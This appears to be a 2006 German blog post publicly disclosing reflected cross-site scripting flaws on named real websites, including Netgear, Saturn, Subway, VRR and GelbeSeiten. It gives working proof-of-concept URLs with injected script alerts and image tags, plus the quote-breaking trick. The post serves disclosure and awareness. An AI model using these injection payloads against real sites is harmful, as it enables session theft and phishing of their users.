<html><body><p>Auf dem 23C3 in Berlin wurden einige interessante Hacks vorgestellt, und im Wiki tauchte eine kleine Liste auf, was wo wie exploitbar ist. Unter anderem waren auch ein paar wenige Cross-Site-Scripting Sachen dabei. Mich hat es etwas gewundert, dass es wirklich nur wenige waren, und da dachte ich mir, schaust du mal, was heutzutage noch so alles geht.<br>

<br>

Das Ergebnis war leider etwas erschreckend, unter den angreifbaren Seiten waren nicht nur namhafte Netzwerk-Hardware Hersteller, sondern auch der Verkehrsverbund-Rhein-Ruhr, die Gelben-Seten und Das Örtliche. Ich bin kein Black-Hat oder so, möchte die Lücken dennoch hier mal veröffentlichen um die Aufmerksamkeit der Medien ein wenig zu pushen.<br>

<br>

Hier also die Lücken:<br>

<br>

<strong>Netgear</strong><br>

Auf netgear.de kann man ganz einfach einen "bösen" Link bauen:<br>

<a href="http://netgear.de/de/suche.html?q=%3Cscript%3Ealert('hallo')%3C/script%3E">http://netgear.de/de/suche.html?q=%3Cscript%3Ealert('hallo')%3C/script%3E</a><br>

Einfach als Such-Query etwas wie <strong>&lt;script&gt;...&lt;/script&gt;</strong> eingeben.<br>

Netterweise geht das selbe auch auf netgear.com, obwohl deren Flash erstmal bei &lt; im Query das Formular nicht abschicken will, aber wozu gibts Links?<br>

<a href="http://netgear.com/Search.aspx?text=%3Cscript%3Ealert('a')%3C/script%3E">http://netgear.com/Search.aspx?text=%3Cscript%3Ealert('a')%3C/script%3E</a><br>

<br>

<strong>Saturn</strong><br>

saturn.de ist ganz schlau, man kann nur rein, wenn man ein Cookie gesetzt hat. Also kurz auf <a href="http://www.saturn.de">http://www.saturn.de</a> gehen, irgend eine Filiale ausswählen und...<br>

<a href="http://www.saturn.de/frontend/offer/index.cfm?fa=prod_result_agr&amp;prod_search_txt=%22%3E%3Cscript%3Ealert(%22a%22)%3C/script%3E">saturn.de</a> den Link anklicken.<br>

Hier hat man wieder einen typischen Such-Fehler, aber man muss vor dem &lt;script&gt; ein <strong>"&gt;</strong> reinklatschen, damit das input-Feld zuende ist.<br>

<br>

<strong>Subway</strong><br>

Genau das Gleiche passiert auch auf der Seite von Subway, wenn man eine Filiale suchen möchte:<br>

<a href="http://www.subway-sandwiches.de/index.php?id=572&amp;swords=%22%3E%3Cscript%3Ealert(%22a%22)%3C/script%3E&amp;search.x=0&amp;search.y=0">subway-sandwiches.de</a><br>

<br>

<strong>VRR</strong><br>

Wer gerne Online den Fahrplan nachguckt, sollte vrr.de nicht vertrauen:<br>

<a href="http://vrr.de/cgi-bin/search.pl?query=%22%3E%3Cscript%3Ealert(%22a%22)%3C/script%3Esearch_left=Suchen">vrr.de</a><br>

Wieder der selbe Fehler, der netterweise auch auf rheinbahn.de existiert.<br>

<br>

<strong>YellowMap</strong><br>

Den Weg zum 23C3 in Berlin findet man am besten mit yellowmap.de:<br>

<a href="http://www.yellowmap.de/YM/Poi/Poi.aspx?Catchword=%22%3E%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%3E">yellowmap.de</a><br>

Hier wollte ein Script irgendwie nicht, aber das Bild ist doch auch nett, oder?<br>

<br>

<strong>Das Örtliche</strong><br>

Suchmaschinen sind was feines, wenn man vor der Suche weiß, was sie finden:<br>

<a href="http://www2.dasoertliche.de/?buc=&amp;title=%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%3E&amp;page=0&amp;context=0&amp;verlNr=&amp;verlName=&amp;verlUrl=&amp;verlServer=&amp;la=de&amp;cmd=cmd_nav_profile&amp;form_name=meinoetb&amp;action=3&amp;la=de">dasoertliche.de</a><br>

Hier ist übrigens ausnahmsweise nicht die Suche schuld, sondern das dynamische erstellen des Seitentitels aus der URL.<br>

<br>

<strong>GelbeSeiten</strong><br>

Die Krönung war aber die Seite der GelbeSeiten, die Suchfelder für Was und Wo werden nämlich sauber nach "komischen" Zeichen gefiltert, aber die Suche in den Treffern ist angreifbar:<br>

<a href="http://www1.gelbeseiten.de/yp/detailFilterAction.yp;jsessionid=1F9B1BE39A581F611AAF52A864AD87C4.gs1TomcatNode2?at=yp&amp;location=berlin&amp;subject=congress&amp;subscriberLookupID=46575&amp;tradeLookupID=46574&amp;button=top&amp;sortBy=&amp;firstLetter=&amp;tradeFilter=choice&amp;functionFilter=choice&amp;detailTop=%22%3E%3Cscript%3Ealert%28%27a%27%29%3C%2Fscript%3E">gelbeseiten.de</a> (leider ist da eine SessionID drin, aber da kommt man bestimmt auch drumherum)<br>

<br>

Ich verstehe einfach nicht, wie man so fahrlässig handeln kann, werde aber gleich die Betreiber der Seiten und Heise Security mit einem Link zu diesem Beitrag beglücken und hoffen, sie lernen was daraus.</p></body></html>